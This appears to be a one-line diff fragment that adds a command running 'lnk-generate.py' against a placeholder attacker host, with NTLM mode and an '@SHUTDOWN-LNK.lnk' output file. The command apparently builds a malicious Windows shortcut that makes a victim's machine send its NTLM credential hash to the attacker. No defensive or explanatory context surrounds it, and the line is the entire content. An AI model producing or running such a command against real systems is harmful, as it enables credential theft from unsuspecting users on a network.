@@ -1,0 +1,1 @@
+lnk-generate.py --host "$ATTACKER_IP" --type ntlm --output '@SHUTDOWN-LNK.lnk'
